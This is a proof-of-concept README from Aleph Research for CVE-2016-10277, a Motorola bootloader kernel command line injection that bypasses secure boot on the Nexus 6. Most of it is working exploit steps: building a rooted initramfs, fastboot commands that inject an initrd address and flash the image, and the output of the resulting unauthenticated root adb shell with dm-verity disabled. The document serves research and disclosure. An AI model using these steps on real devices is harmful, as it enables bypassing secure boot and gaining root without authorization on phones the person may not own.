# PoC for initroot: Motorola Bootloader Kernel Command Line Injection Secure Boot Bypass (CVE-2016-10277) #

By Roee Hay / Aleph Research, HCL Technologies 

Steps on Nexus 6:

1. Use the commited `initroot.cpio.gz`, or produce your own:

```
$ cd <initramfs folder>
$ find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../initroot.cpio.gz
$ cd ..
```

Our commited initramfs contains an AOSP userdebug root partition with adb running as root by default. It will not ask for authorization. In addition, dm-verity is disabled on the system partition.

2. `fastboot oem config fsg-id "a initrd=0x11000000,<initroot.cpio.gz size>"`
3. `fastboot flash foo initroot.cpio.gz`
4. `fastboot continue`
5. if you use our initramfs, `adb shell` will now give you a root shell:

```
$ adb shell
shamu:/ # id 
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
```

**Note**:
This vulnerability affects other Motorola devices too: a different initramfs will be needed. A different physical address of initrd (0x11000000 on Nexus 6) may vary as well.

Blog post with details is available [here](https://alephsecurity.com/2017/05/23/nexus6-initroot/)




